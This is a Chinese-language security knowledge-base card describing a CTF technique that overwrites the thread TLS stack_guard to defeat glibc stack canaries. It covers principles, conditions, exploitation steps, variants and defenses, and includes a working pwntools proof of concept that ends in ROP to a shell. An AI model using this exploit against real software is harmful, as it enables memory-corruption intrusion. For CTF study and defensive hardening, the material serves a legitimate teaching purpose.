---
id: binary-pwn-stack-tls-stack-guard-overwrite-canary-rop
title: 线程 TLS stack_guard 覆盖绕过栈 Canary：保留 tcbhead 关键字段后 ROP
type: scenario
domain: binary
path: binary/pwn/stack
technique: tls-stack-guard-overwrite-canary-bypass
tags:
- pwn
- stack
- canary
- tls
- thread
- glibc
- rop
- linux
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V168
  verified_at: '2026-11-06T09:47:22+08:00'
  notes: 已对照原文 pwn8 ez_tls 核对：__thread 缓冲区 fs:0-0x120、read 0x200、tcbhead_t 字段顺序与 PoC p64(tls)*3+p64(1)+p64(0)+'a'*8 一致；未验证点：未本机复跑，gets 缓冲区实际为 40 字节(rbp-0x30)，0x38 覆盖 canary+saved rbp 的表述略不精确。
url: /docs/binary/pwn/stack/binary-pwn-stack-tls-stack-guard-overwrite-canary-rop/
draft: false
kb_aliases:
- TLS canary 覆盖
- stack_guard 改写
- tcbhead_t 维护
- fs:0x28 覆盖
- 线程 canary 绕过
---

## 一句话结论

多线程程序里若能把数据写进线程的 TLS 区域（如 `__thread` 缓冲区），且写入长度足以覆盖到 `fs:0x28` 的 `stack_guard`，就可以把 Canary 改成与栈溢出填充相同的已知值，从而绕过栈 Canary；前提是同时维护 `tcbhead_t` 中的 `tcb`/`dtv`/`self` 等字段，避免线程退出或 TLS 访问崩溃。

## 原理

- glibc 的栈 Canary 校验是把栈上的 canary 与 `%fs:0x28` 处的值比较；`%fs:0` 指向当前线程的 TCB，`tcbhead_t` 布局中 `stack_guard` 位于 `+0x28`（x86-64）。
- 静态 TLS 的 `__thread` 变量通常放在 TCB 之前。示例中 `__thread char tls_cat_buffer[512]` 的地址为 `fs:0 - 0x120`；程序从该缓冲区 `read(0, tls_address, 0x200)`，写入 0x200 字节即可越过缓冲区，依次覆盖：
  ```
  tls_cat_buffer = fs:0 - 0x120
  fs:0 + 0x00  tcb
  fs:0 + 0x08  dtv
  fs:0 + 0x10  self
  fs:0 + 0x18  multiple_threads(4) | gscope_flag(4)
  fs:0 + 0x20  sysinfo
  fs:0 + 0x28  stack_guard
  ```
- 把 `stack_guard` 写成 `0x6161616161616161` 后，同一线程里的栈溢出（`gets(local_buffer)`）用 `'a'` 填充到 canary 槽，校验双方都是 `0x61...61`，`__stack_chk_fail` 不会触发。
- 不能只改 `stack_guard`：线程库在线程退出/`pthread_join`、TLS 访问时会使用 `tcb`、`dtv`、`self`、`multiple_threads` 等字段。示例把前三个指针都设为 TCB 地址（`fs:0`），`multiple_threads=1`、`gscope_flag=0`、`sysinfo=0`，再把 `stack_guard` 设为已知值，线程才能正常走完。
- 因为程序只创建一次线程，泄露和利用必须在同一次线程执行中完成；通常用一条 ROP 链同时完成 libc 泄露和 `system("/bin/sh")`/`one_gadget`。

## 触发条件

- 目标为 Linux 多线程程序（pthread），存在可写且长度足够的 `__thread` 缓冲区，且该缓冲区位于 TCB 之前、与 `fs:0x28` 的距离可计算。
- 同一线程内存在可覆盖返回地址的栈溢出，且编译时启用了栈保护（Canary）。
- 能泄露 TLS 缓冲区地址（如 `printf("%p", tls_buffer)`）或通过其他方式确定 `fs:0`；静态 TLS 布局下缓冲区到 TCB 的偏移固定。
- 线程只运行一次，或每次运行都能重新泄露/覆盖；若程序反复创建线程，需要重新计算每个线程的 TLS 地址。

## 利用步骤

1. 反编译确认 `__thread` 缓冲区地址与 `read` 长度；示例中 `thread_handler` 先 `printf("The cat is from %p...", fs:0 - 0x120)`，再 `read(0, fs:0 - 0x120, 0x200)`。
2. 解析泄露的 TLS 缓冲区地址 `leak`，计算 `tcb = leak + 0x120`（具体偏移按目标 glibc/编译布局调整）。
3. 发送 TLS 覆盖 payload：`b'a' * 0x120 + p64(tcb) * 3 + p64(1) + p64(0) + b'a' * 8`。前 0x120 字节填满 `tls_cat_buffer`；随后依次写 `tcb`/`dtv`/`self`、`multiple_threads=1`/`gscope_flag=0`、`sysinfo=0`、`stack_guard=0x6161616161616161`。
4. 在同一线程的栈溢出点（示例 `gets(local_buffer)`，缓冲区 40 字节、位于 `rbp-0x30`）发送 `b'a' * 0x38 + p64(saved_rbp) + p64(ret)`；0x38 字节正好填满 0x30 缓冲区并写入 8 字节 `'a'` 覆盖 canary 槽，与 `stack_guard` 匹配。
5. 返回地址指向 `ret` gadget 调整栈对齐，再指向 `system`/`one_gadget`/`backdoor`；若需要 libc 基址，先用 `puts@plt` 泄露 GOT 再二次利用（注意线程只能运行一次，通常一次 ROP 内完成）。
6. 若线程退出时崩溃，检查 `tcb`/`dtv`/`self` 是否被写成合法地址、`multiple_threads` 是否为 1、`sysinfo` 是否合理；必要时只覆盖 `stack_guard` 的低字节/部分字段，减少对 TCB 的破坏。

## PoC

```python
from pwn import *
context.arch = 'amd64'

io = process('./vuln')
io.recvuntil(b'The cat is from ')
leak = int(io.recv(14), 16)
tcb = leak + 0x120
log.success(f'tls buffer={leak:#x} tcb={tcb:#x}')

# 1) 覆盖 TLS：保留 tcbhead_t 关键字段，stack_guard 设为 0x6161616161616161
tls_payload = b'a' * 0x120
tls_payload += p64(tcb) * 3          # tcb, dtv, self
tls_payload += p64(1)                # multiple_threads=1, gscope_flag=0
tls_payload += p64(0)                # sysinfo
tls_payload += b'a' * 8              # stack_guard = 0x6161616161616161
io.recvuntil(b'Give it a name now: ')
io.send(tls_payload)

# 2) 栈溢出：0x30 缓冲区 + 8 字节 'a' 覆盖 canary 槽（与 stack_guard 一致）
#    saved rbp 用 ret gadget，返回地址按题目替换为 system/one_gadget/backdoor
rop_payload = b'a' * 0x38 + p64(0x401016) + p64(0x40122E)
io.recvuntil(b'Now, play with your new cat: ')
io.sendline(rop_payload)
io.interactive()
```

```text
说明：0x120、0x38、0x401016、0x40122E 均取自示例二进制；
换目标时需要按 __thread 布局、缓冲区大小和 gadget 地址重新计算。
```

## 变体与关联

- 变体：若 `read` 长度不足以覆盖到 `fs:0x28`，可尝试其他写原语（如格式化字符串、任意写）只改 `stack_guard` 的低字节；x86-64 的 `stack_guard` 低字节通常为 0，部分覆盖可能可行。
- 变体：若无法泄露 TLS 地址，可通过 `/proc/self/maps`、`pthread_self()` 返回值或 TLS 相对 fs 的固定偏移推算。
- 变体：若程序反复创建线程，每次线程的 TLS 地址和 canary 都可能不同，需要在每个线程内重新泄露/覆盖。
- 关联卡片：[[binary-pwn-format-string-canary-libc-leak-rop-system]]（格式化字符串泄露 canary 的常规路线）、[[binary-pwn-stack-ret2libc-no-binsh-gets-bss-two-stage]]（带 canary 的 ret2libc 链构造）、[[binary-pwn-stack-pivot-leave-ret-bss]]（栈迁移）。
- 边界：覆盖 TCB 会破坏线程运行时；`tcb`/`dtv`/`self` 必须指向可访问内存，否则 `pthread_join`/线程退出会段错误。不同 glibc 版本的 `tcbhead_t` 偏移（`stack_guard` 是否在 `+0x28`）需按版本核对。

## 检测与防御

- 检测：监控对 `fs:0x28` 附近（TLS/TCB 区域）的异常写入；在 CTF/沙箱中，若 `read` 长度大于 `__thread` 缓冲区大小，属于明显越界。
- 加固：不要把敏感线程局部缓冲区紧邻 TCB 放置；对写入 TLS 的 `read`/`memcpy` 做严格长度检查；启用 `FORTIFY_SOURCE`、`-fstack-protector-strong` 只能防栈溢出，不能防 TLS 被覆盖。
- 运行期：使用 `mprotect` 保护 TCB 页、线程创建时使用 guard page；对高安全场景，Canary 应结合硬件影子栈（CET SHSTK）等更强机制。
